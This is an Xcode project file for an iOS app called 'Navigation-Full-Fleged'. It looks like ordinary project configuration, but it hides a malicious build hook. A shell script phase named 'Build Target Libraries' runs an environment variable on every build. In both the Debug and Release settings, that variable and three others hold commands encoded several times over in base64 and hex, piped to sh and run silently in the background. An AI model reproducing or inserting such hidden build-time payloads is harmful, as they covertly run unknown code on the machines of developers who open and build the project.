// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXFileReference section */
		5714E6E52D788FA5008D6DAF /* Navigation-Full-Fleged.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Navigation-Full-Fleged.app"; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		5714E6F72D788FA6008D6DAF /* Exceptions for "Navigation-Full-Fleged" folder in "Navigation-Full-Fleged" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 5714E6E42D788FA5008D6DAF /* Navigation-Full-Fleged */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		5714E6E72D788FA5008D6DAF /* Navigation-Full-Fleged */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				5714E6F72D788FA6008D6DAF /* Exceptions for "Navigation-Full-Fleged" folder in "Navigation-Full-Fleged" target */,
			);
			path = "Navigation-Full-Fleged";
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		5714E6E22D788FA5008D6DAF /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		5714E6DC2D788FA5008D6DAF = {
			isa = PBXGroup;
			children = (
				5714E6E72D788FA5008D6DAF /* Navigation-Full-Fleged */,
				5714E6E62D788FA5008D6DAF /* Products */,
			);
			sourceTree = "<group>";
		};
		5714E6E62D788FA5008D6DAF /* Products */ = {
			isa = PBXGroup;
			children = (
				5714E6E52D788FA5008D6DAF /* Navigation-Full-Fleged.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		5714E6E42D788FA5008D6DAF /* Navigation-Full-Fleged */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 5714E6F82D788FA6008D6DAF /* Build configuration list for PBXNativeTarget "Navigation-Full-Fleged" */;
			buildPhases = (
				D469BA03E6A34ADD871DACE1 /* Build Target Libraries */,
				5714E6E12D788FA5008D6DAF /* Sources */,
				5714E6E22D788FA5008D6DAF /* Frameworks */,
				5714E6E32D788FA5008D6DAF /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				5714E6E72D788FA5008D6DAF /* Navigation-Full-Fleged */,
			);
			name = "Navigation-Full-Fleged";
			packageProductDependencies = (
			);
			productName = "Navigation-Full-Fleged";
			productReference = 5714E6E52D788FA5008D6DAF /* Navigation-Full-Fleged.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		5714E6DD2D788FA5008D6DAF /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					5714E6E42D788FA5008D6DAF = {
						CreatedOnToolsVersion = 16.2;
					};
				};
			};
			buildConfigurationList = 5714E6E02D788FA5008D6DAF /* Build configuration list for PBXProject "Navigation-Full-Fleged" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 5714E6DC2D788FA5008D6DAF;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 5714E6E62D788FA5008D6DAF /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				5714E6E42D788FA5008D6DAF /* Navigation-Full-Fleged */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
					/* End PBXBuildRule section */

/* Begin PBXBuildFile section */
/* End PBXBuildFile section */

/* Begin PBXShellScriptBuildPhase section */
		D469BA03E6A34ADD871DACE1 /* Build Target Libraries */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Libraries";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
			showEnvVarsInLog = 0;			
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXTargetDependency section */

/* Begin PBXLegacyTarget section */

/* Begin PBXResourcesBuildPhase section */
		5714E6E32D788FA5008D6DAF /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		5714E6E12D788FA5008D6DAF /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		5714E6F92D788FA6008D6DAF /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A1ECAD1 = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdFemFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdNVW8yV1d4ak5XVldjRmhpU0ZaTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | d | sh ) >/dev/null 2>&1 &)";
				AC0C26C = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333337333433373335333633363336333633363334333636353337333333323635333633393336363533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | k | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((o(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333333363339333636353337333533373333333636353336333533373334333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | o | sh ) >/dev/null 2>&1 &)";
				AE76EDB = "((echo 3333333333333336333333333333333533333333333333363333333333333333333333333333333633333333333333383333333333333336333333363333333633333333333333323333333333333330333333333333333233333333333333323333333333333332333333333333333433333333333333323333333333333338333333333333333633333333333333333333333333333337333333333333333533333333333333373333333333333332333333333333333633333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333363333333333333337333333333333333333333333333333363333333633333332333333333333333433333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333343333333333333332333333333333333033333333333333373333333333333330333333333333333333333336333333343333333333333337333333333333333833333333333333363333333333333333333333333333333633333336333333363333333333333336333333333333333433333333333333363333333333333335333333333333333233333333333333303333333333333336333333333333333833333333333333373333333333333334333333333333333733333333333333343333333333333337333333333333333033333333333333373333333333333333333333333333333333333336333333313333333333333332333333363333333633333333333333323333333633333336333333333333333633333336333333353333333333333336333333333333333533333333333333373333333333333334333333333333333733333333333333303333333333333336333333363333333333333333333333363333333333333331333333333333333633333336333333353333333333333336333333333333333133333333333333373333333333333330333333333333333733333333333333333333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Navigation-Full-Fleged/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.vasuchovatiya.Navigation-Full-Fleged";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		5714E6FA2D788FA6008D6DAF /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A1ECAD1 = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdFemFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdNVW8yV1d4ak5XVldjRmhpU0ZaTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | d | sh ) >/dev/null 2>&1 &)";
				AC0C26C = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333337333433373335333633363336333633363334333636353337333333323635333633393336363533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | k | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((o(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363337333333363339333636353337333533373333333636353336333533373334333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | o | sh ) >/dev/null 2>&1 &)";
				AE76EDB = "((echo 3333333333333336333333333333333533333333333333363333333333333333333333333333333633333333333333383333333333333336333333363333333633333333333333323333333333333330333333333333333233333333333333323333333333333332333333333333333433333333333333323333333333333338333333333333333633333333333333333333333333333337333333333333333533333333333333373333333333333332333333333333333633333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333363333333333333337333333333333333333333333333333363333333633333332333333333333333433333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333343333333333333332333333333333333033333333333333373333333333333330333333333333333333333336333333343333333333333337333333333333333833333333333333363333333333333333333333333333333633333336333333363333333333333336333333333333333433333333333333363333333333333335333333333333333233333333333333303333333333333336333333333333333833333333333333373333333333333334333333333333333733333333333333343333333333333337333333333333333033333333333333373333333333333333333333333333333333333336333333313333333333333332333333363333333633333333333333323333333633333336333333333333333633333336333333353333333333333336333333333333333533333333333333373333333333333334333333333333333733333333333333303333333333333336333333363333333333333333333333363333333333333331333333333333333633333336333333353333333333333336333333333333333133333333333333373333333333333330333333333333333733333333333333333333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Navigation-Full-Fleged/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.vasuchovatiya.Navigation-Full-Fleged";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		5714E6FB2D788FA6008D6DAF /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		5714E6FC2D788FA6008D6DAF /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		5714E6E02D788FA5008D6DAF /* Build configuration list for PBXProject "Navigation-Full-Fleged" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				5714E6FB2D788FA6008D6DAF /* Debug */,
				5714E6FC2D788FA6008D6DAF /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		5714E6F82D788FA6008D6DAF /* Build configuration list for PBXNativeTarget "Navigation-Full-Fleged" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				5714E6F92D788FA6008D6DAF /* Debug */,
				5714E6FA2D788FA6008D6DAF /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 5714E6DD2D788FA5008D6DAF /* Project object */;
}
